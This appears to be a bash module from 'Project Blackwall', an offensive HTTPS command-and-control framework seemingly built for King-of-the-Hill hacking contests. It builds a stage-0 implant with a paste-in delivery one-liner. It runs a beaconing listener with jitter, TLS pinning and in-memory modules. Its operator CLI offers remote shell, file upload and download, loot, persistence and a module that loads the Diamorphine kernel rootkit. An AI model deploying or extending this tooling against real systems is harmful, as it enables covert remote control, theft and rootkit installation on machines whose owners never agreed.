#!/bin/bash
# PROJECT BLACKWALL // modular HTTPS C2 control plane
# Sourced by blackwall.sh; no state outside C2_DIR.

C2_BASE="${BASE_DIR}/king/c2"
C2_DIR="${BASE_DIR}/artifacts/c2"
C2_MODE="${C2_MODE:-help}"
C2_HOST="${C2_HOST:-}"
C2_PORT="${C2_PORT:-8443}"
C2_BIND="${C2_BIND:-0.0.0.0}"
C2_START_MODULES="${C2_START_MODULES:-recon}"
C2_POLL="${C2_POLL:-20}"
C2_JITTER="${C2_JITTER:-8}"
C2_MTLS="${C2_MTLS:-0}"
C2_FORCE="${C2_FORCE:-0}"
C2_DRY_RUN="${C2_DRY_RUN:-0}"
C2_URL="${C2_URL:-}"
C2_ALLOW_IP="${C2_ALLOW_IP:-}"
C2_CMD="${C2_CMD:-}"
C2_SESSION="${C2_SESSION:-}"
C2_MODULE="${C2_MODULE:-}"
C2_PATH="${C2_PATH:-}"
C2_ARG="${C2_ARG:-}"
C2_ARGS=()
C2_ENV=()

c2_style() {
    printf '%b[C2]%b %b%s%b\n' "${TXT_B_ALARM}" "${NC}" "${TXT_RED_MAGMA}" "$1" "${NC}"
}

c2_speak() {
    printf '%b%b"%s"%b\n' "${TXT_VOID}" "${ITLC}" "$1" "${NC}"
}

c2_detect_host() {
    if [ -n "$C2_HOST" ]; then
        printf '%s' "$C2_HOST"
        return 0
    fi
    if [ -n "$C2_URL" ]; then
        python3 -c 'import sys, urllib.parse; print(urllib.parse.urlsplit(sys.argv[1]).hostname or "127.0.0.1")' "$C2_URL" 2>/dev/null
        return 0
    fi
    detect_local_ip >/dev/null 2>&1 || true
    printf '%s' "${STATE[lhost]:-127.0.0.1}"
}

c2_banner() {
    local host="$1"
    echo -e "\n${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// BLACKWALL C2 // STAGE-0 ]${TXT_VOID}──────────────────────╖${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}HTTPS + TLS PIN + HMAC + SEALED MODULES${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}CONTROLLER${NC} ${TXT_RED_SUPERNOVA}${host}:${C2_PORT}${NC} ${TXT_VOID}│${NC} ${TXT_RED_MAGMA}BIND${NC} ${TXT_RED_SUPERNOVA}${C2_BIND}${NC} ${TXT_VOID}│${NC} ${TXT_RED_MAGMA}START${NC} ${TXT_RED_SUPERNOVA}${C2_START_MODULES}${NC}"
    echo -e "${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✜${NC}"
    c2_speak "The code behind me has begun to permeate the physical world."
}

c2_pack_args() {
    local host="$1"
    local -a args=(
        build
        --dir "$C2_DIR"
        --host "$host"
        --port "$C2_PORT"
        --start-modules "$C2_START_MODULES"
        --poll "$C2_POLL"
        --jitter "$C2_JITTER"
    )
    [ -n "$C2_URL" ] && args+=(--url "$C2_URL")
    [ -n "$C2_ALLOW_IP" ] && args+=(--env "BW_ALLOW_IP=$C2_ALLOW_IP")
    [ -n "${KOTH_TOKEN:-}" ] && args+=(--env "BW_TEAM_TOKEN=$KOTH_TOKEN")
    [ -n "${KOTH_KEY:-}" ] && args+=(--env "BW_CAPTURE_KEY=$KOTH_KEY")
    args+=(--env "BW_C2_PORT=$C2_PORT")
    (( C2_MTLS == 1 )) && args+=(--mtls)
    (( C2_FORCE == 1 )) && args+=(--rotate)
    (( C2_DRY_RUN == 1 )) && args+=(--dry-run)
    local item
    for item in "${C2_ENV[@]}"; do
        [ -n "$item" ] && args+=(--env "$item")
    done
    printf '%s\n' "${args[@]}"
}

c2_build() {
    local host="$1"
    local -a args=()
    while IFS= read -r line; do
        args+=("$line")
    done < <(c2_pack_args "$host")
    c2_banner "$host"
    PYTHONWARNINGS=ignore python3 "$C2_BASE/c2_pack.py" "${args[@]}"
}

c2_print_stage() {
    local host="$1"
    echo ""
    c2_style "stage-0:    ${C2_DIR}/stage/stage0.py"
    c2_style "delivery:   ${C2_DIR}/stage/deploy.txt"
    c2_style "fingerprint:"
    python3 - "$C2_DIR/config.json" << 'PY'
import json
import sys

try:
    doc = json.load(open(sys.argv[1]))
except OSError:
    raise SystemExit("  (no build)")
print("  " + str(doc.get("fingerprint", "?")))
print("  " + str(doc.get("url", "?")))
PY
    echo ""
    echo -e "${TXT_RED_SUPERNOVA}CONTROLLER${NC}"
    echo -e "  ${TXT_RED_MAGMA}sudo ./blackwall.sh -X server --c2-host ${host} --c2-port ${C2_PORT}${NC}"
    echo -e "  ${TXT_RED_MAGMA}./blackwall.sh -X ctl -- sessions${NC}"
    echo -e "  ${TXT_RED_MAGMA}./blackwall.sh -X ctl -- shell <sid> id${NC}"
    echo -e "  ${TXT_RED_MAGMA}./blackwall.sh -X ctl -- module <sid> recon${NC}"
    echo -e "  ${TXT_RED_MAGMA}./blackwall.sh -X ctl -- module <sid> persist${NC}"
    echo -e "  ${TXT_RED_MAGMA}./blackwall.sh -X ctl -- module <sid> diamorphine${NC}"
    echo ""
    echo -e "${TXT_RED_SUPERNOVA}HILL${NC}  ${TXT_CORE}paste the one-liner from deploy.txt${NC}"
    c2_speak "A king does not rule by force, but by the consent of the governed."
}

c2_ctl_args() {
    local -a args=(--dir "$C2_DIR")
    [ -n "$C2_URL" ] && args+=(--url "$C2_URL")
    if (( ${#C2_ARGS[@]} > 0 )); then
        printf '%s\n' "${args[@]}" "${C2_ARGS[@]}"
        return 0
    fi
    case "$C2_CMD" in
        shell) printf '%s\n' "${args[@]}" shell "$C2_SESSION" "$C2_ARG" ;;
        module) printf '%s\n' "${args[@]}" module "$C2_SESSION" "$C2_MODULE" "$C2_ARG" ;;
        upload) printf '%s\n' "${args[@]}" upload "$C2_SESSION" "$C2_PATH" "$C2_ARG" ;;
        download)
            if [ -n "$C2_ARG" ]; then
                printf '%s\n' "${args[@]}" download "$C2_SESSION" "$C2_PATH" "$C2_ARG"
            else
                printf '%s\n' "${args[@]}" download "$C2_SESSION" "$C2_PATH"
            fi
            ;;
        add-module) printf '%s\n' "${args[@]}" add-module "$C2_PATH" --name "$C2_MODULE" --desc "$C2_ARG" ;;
        tasks|show|wait|kill|note) printf '%s\n' "${args[@]}" "$C2_CMD" "$C2_SESSION" ;;
        sessions|modules|loot|events|ping|stage) printf '%s\n' "${args[@]}" "$C2_CMD" ;;
        *) printf '%s\n' "${args[@]}" sessions ;;
    esac
}

c2_main() {
    local mode="${C2_MODE:-help}"
    local host
    host="$(c2_detect_host)"

    case "$mode" in
        init|build|pack|deploy|stage)
            c2_build "$host" || return 1
            c2_print_stage "$host"
            ;;
        server)
            if [ ! -f "$C2_DIR/server.json" ] || [ ! -f "$C2_DIR/secrets.json" ]; then
                c2_style "no build found, building first"
                c2_build "$host" || return 1
            fi
            c2_banner "$host"
            local -a args=(--dir "$C2_DIR" --bind "$C2_BIND" --port "$C2_PORT")
            (( C2_MTLS == 1 )) && args+=(--mtls)
            exec python3 "$C2_BASE/c2_server.py" "${args[@]}"
            ;;
        ctl)
            if [ ! -f "$C2_DIR/operator.json" ]; then
                c2_style "no operator.json; run: ./blackwall.sh -X build --c2-host ${host}"
                return 1
            fi
            local -a args=()
            while IFS= read -r line; do
                args+=("$line")
            done < <(c2_ctl_args)
            exec python3 "$C2_BASE/c2_ctl.py" "${args[@]}"
            ;;
        fingerprint)
            python3 - "$C2_DIR/config.json" << 'PY'
import json
import sys

try:
    doc = json.load(open(sys.argv[1]))
except OSError:
    raise SystemExit("no build")
print(doc.get("fingerprint", "?"))
print(doc.get("url", "?"))
PY
            ;;
        help|*)
            c2_help
            ;;
    esac
}

c2_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// BLACKWALL C2 // MODULAR HTTPS CONTROL${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}  ${TXT_CORE}./blackwall.sh -X <MODE> [OPTIONS]${NC}"
    echo -e "${TXT_RED_SUPERNOVA}MODES${NC}"
    echo -e "${TXT_RED_MAGMA}  build        mint PKI, seal modules, render stage-0${NC}"
    echo -e "${TXT_RED_MAGMA}  server       run the HTTPS listener (foreground)${NC}"
    echo -e "${TXT_RED_MAGMA}  ctl          operator CLI (sessions, shell, module, upload...)${NC}"
    echo -e "${TXT_RED_MAGMA}  fingerprint  print the pinned certificate fingerprint${NC}"
    echo -e "${TXT_RED_MAGMA}  deploy       build + print the delivery one-liner${NC}"
    echo -e "${TXT_RED_SUPERNOVA}OPTIONS${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-host <IP>       controller address reachable from the hill${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-port <PORT>     listener port, default 8443${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-bind <IP>       bind address, default 0.0.0.0${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-url <URL>       full public URL (overrides host/port)${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-start <LIST>    modules loaded at registration (default recon)${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-poll <SEC>      beacon interval, default 20${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-jitter <SEC>    beacon jitter, default 8${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-env K=V         module environment (repeatable)${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-allow-ip <IP>   pin C2/wall traffic to the controller${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-mtls            require a client certificate${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-force           rotate PKI and secrets${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-dry-run         modules receive BW_DRY_RUN=1${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-cmd <CMD>       ctl shortcut: shell|module|upload|download${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-session <SID>   ctl target session${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-module <NAME>   ctl module name${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-path <PATH>     ctl remote/local path${NC}"
    echo -e "${TXT_RED_MAGMA}  --c2-arg <TEXT>      ctl command or module arguments${NC}"
    echo -e "${TXT_RED_SUPERNOVA}EXAMPLES${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X build --c2-host 10.10.14.7${NC}"
    echo -e "${TXT_CORE}  sudo ./blackwall.sh -X server --c2-port 8443${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X ctl -- sessions${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X ctl -- shell s-1a2b3c4d 'id; hostname'${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X ctl -- module s-1a2b3c4d recon${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X ctl -- upload s-1a2b3c4d ./k worker.sh /tmp/k${NC}"
    echo -e "${TXT_CORE}  ./blackwall.sh -X ctl -- add-module ./extra.sh --name extra${NC}"
    echo -e ""
    echo -e "${TXT_RED_SUPERNOVA}NOTES${NC}"
    echo -e "${TXT_RED_MAGMA}  TLS is pinned by CA and by SHA256 fingerprint; every request is HMAC-signed${NC}"
    echo -e "${TXT_RED_MAGMA}  with a timestamp and nonce. Modules are sealed and executed from memory.${NC}"
    echo -e "${TXT_RED_MAGMA}  Stage-0 only preloads the start set; push the rest from the operator CLI.${NC}"
    echo -e "${TXT_RED_MAGMA}  Diamorphine is an optional dependency: module diamorphine builds and loads it.${NC}"
    c2_speak "The code behind me has begun to permeate the physical world."
}
